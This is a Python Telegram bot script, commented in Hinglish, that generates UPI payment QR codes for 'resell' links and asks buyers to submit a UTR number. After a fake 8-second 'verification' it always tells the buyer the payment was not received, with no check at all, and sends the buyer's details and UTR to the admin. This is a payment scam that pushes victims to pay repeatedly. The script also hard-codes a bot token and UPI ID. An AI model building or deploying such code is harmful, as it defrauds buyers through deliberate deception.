import telebot
import qrcode
import io
import os
import secrets
from flask import Flask
from threading import Thread

# --- CONFIGURATION ---
BOT_TOKEN = "8963839676:AAHVVvMTYEQoye1geKxR_18iIjW7Lkqyou4"
ADMIN_ID = 8393210427  
YOUR_UPI_ID = "BHARATPE2Z0D0G3U4Z52337@unitype"
BOT_USERNAME = "SkyBoxx_bot"

# --- PERMANENT LINKS CHART ---
# 📝 Line 17: Jo bhi link aap permanently save rakhna chahte hain, use niche jodte jayein:
saved_links = {
    "xyz12345": 82.05, # Example permanent link
    "ec9d0934afe7": 78.0,
}

app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

keep_alive()
bot = telebot.TeleBot(BOT_TOKEN)

def generate_upi_qr(upi_id, amount):
    upi_url = f"upi://pay?pa={upi_id}&am={amount}&cu=INR"
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    return img_byte_arr

# --- ADMIN COMMAND: Link Generate Karein ---
@bot.message_handler(commands=['gen'])
def generate_link(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Sahi format: `/gen <amount>`", parse_mode="Markdown")
        return
    try:
        amount = round(float(args[1]), 2)
    except ValueError:
        bot.reply_to(message, "❌ Invalid amount!", parse_mode="Markdown")
        return

    if amount in saved_links.values():
        bot.reply_to(message, f"⚠ ₹{amount} ka link pehle se bana hai!", parse_mode="Markdown")
        return

    unique_token = secrets.token_hex(6)
    saved_links[unique_token] = amount 

    link = f"https://t.me/{BOT_USERNAME}?start=resell_{unique_token}"
    bot.reply_to(message, f"✅ *Link Generated:*\n\n`{link}`\n\n📝 Is token ko code me `saved_links` ke andar `\"{unique_token}\": {amount}` jod dena taaki permanent rahe.", parse_mode="Markdown")

# --- USER COMMAND: Start Link Handling ---
@bot.message_handler(commands=['start'])
def handle_start(message):
    text_args = message.text.split()
    if len(text_args) < 2 or not text_args[1].startswith("resell_"):
        return 
        
    token = text_args[1].replace("resell_", "")
    if token not in saved_links:
        return 

    amount = saved_links[token]
    
    loading_msg = bot.send_message(message.chat.id, "⏳ *Preparing secure checkout...*", parse_mode="Markdown")
    qr_img = generate_upi_qr(YOUR_UPI_ID, amount)
    
    caption_text = f"Pay ₹{amount} for the item\n\nUPI ID — {YOUR_UPI_ID}\n\nInstructions:\n• Scan QR or copy UPI ID\n• Pay exactly ₹{amount} within 10 minutes\n• After payment, please submit 12 digit UTR."
    
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton("📥 Submit UTR", callback_data=f"sub_{amount}")
    markup.add(btn)
    
    bot.send_photo(message.chat.id, qr_img, caption=caption_text, reply_markup=markup)
    try:
        bot.delete_message(message.chat.id, loading_msg.message_id)
    except Exception:
        pass

# --- USER CALLBACK: Submit UTR Button Click ---
@bot.callback_query_handler(func=lambda call: call.data.startswith('sub_'))
def handle_sub_callback(call):
    amount = call.data.replace("sub_", "")
    msg = bot.send_message(call.message.chat.id, f"📝 *Kripya ₹{amount} ka 12-digit UTR number bhejiye:*", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_utr, amount)
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

def process_utr(message, amount):
    utr = message.text.strip()
    if len(utr) != 12 or not utr.isdigit():
        msg = bot.reply_to(message, "❌ Invalid UTR! 12-digit ka number bhejiye. Dobara button daba kar try karein.")
        return
        
    # # 1. Pehle user ko bolenge ki verify ho raha hai
    bot.reply_to(message, "*⏳ Apka UTR verify ho raha hai...*", parse_mode="Markdown")
    
    # # 2. 8 second ka wait lagayenge
    import time
    time.sleep(8)
    
    # # 3. User ko bold text mein reply bhejenge
    bot.reply_to(message, "*Apka payment receive nhi hua ❌\nPlease try again....*", parse_mode="Markdown")
    
    # # 4. Admin ko notification bhejenge (Sirf Naam, ID, Amount aur UTR/Transaction ID)
    admin_caption = (
        f"🔔 *Naya Payment Request!*\n\n"
        f"👤 *User:* {message.from_user.first_name}\n"
        f"🆔 *User ID:* `{message.from_user.id}`\n"
        f"💰 *Amount:* ₹{amount}\n"
        f"🧾 *Transaction ID (UTR):* `{utr}`"
    )
    
    bot.send_message(ADMIN_ID, admin_caption, parse_mode="Markdown")

if __name__ == '__main__':
    bot.infinity_polling()
